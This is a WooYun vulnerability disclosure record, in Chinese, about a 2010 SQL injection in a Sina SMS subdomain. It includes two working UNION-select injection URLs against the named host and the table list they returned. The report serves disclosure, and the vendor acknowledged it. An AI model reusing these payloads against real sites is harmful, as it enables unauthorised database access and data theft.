wybug_title: 新浪一分站存在SQL注入漏洞
wybug_detail: 漏洞详情 披露状态：   									2010-12-30：	细节已通知厂商并且等待厂商处理中									2010-12-30：	厂商已经确认，细节仅向厂商公开									2011-01-09：	细节向核心白帽子及相关领域专家公开									2011-01-19：	细节向普通白帽子公开									2011-01-29：	细节向实习白帽子公开									2011-01-29：	细节向公众公开  简要描述： GPC未开启，单引号未过滤。 详细说明：  http://us-sms.sina.com/click.php?site=jiaoyou' and  0 union select GROUP_CONCAT(SCHEMA_NAME) from information_schema.SCHEMATA%23http://us-sms.sina.com/click.php?site=jiaoyou' and  0 union select SUBSTRING(GROUP_CONCAT(TABLE_NAME),1,100) from information_schema.TABLES where TABLE_SCHEMA = 0x736d735f7479636f6f6c%23   漏洞证明：  ads_click,ads_manage,application,bulk_sms_phone_area,ip_log,log,m2c_userinfo,meeting,meeting_user,mms_receive,mms_send,proxy_num_map,proxy_sms_deliver,sms_about,sms_app,sms_ban_ip,sms_credit_log,sms_oc,sms_email,sms_email_send,sms_feedback,sms_ignore_phone,sms_intro,sms_ip,sms_ip_new,sms_log,sms_pay,sms_pay_creditcard,sms_pay_sms4china,sms_phonebook,sms_phonebook_check,sms_phonebook_group,sms_phonebook_import,sms_receive,sms_receive_2004,sms_receive_2005,sms_receive_2006,sms_receive_2007,sms_receive_2008,sms_receive_2009,sms_receive_201009,sms_receive_20100930,sms_receive_lostfound,sms_receive_proxy,sms_receive_proxy_2006,sms_receive_proxy_2007,sms_receivea,sms_report,sms_report_20101113,sms_salary_log,sms_send,sms_send_2004,sms_send_2005,sms_send_2006,sms_send_2007,sms_send_2008,sms_send_2009,sms_send_all,sms_send_autumn,sms_send_b,sms_send_proxy,sms_send_proxy_2006,sms_send_proxy_2007,sms_send_proxy_20080421,sms_send_time,sms_soft_down,sms_sysmsg,sms_user,sms_user_20090609_snap,sms_user_proxy,sms_user_regi   修复方案：  你懂的.   版权声明：转载请注明来源 Vi0lent@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2010-12-30 16:21 厂商回复： 谢谢提供 最新状态： 暂无
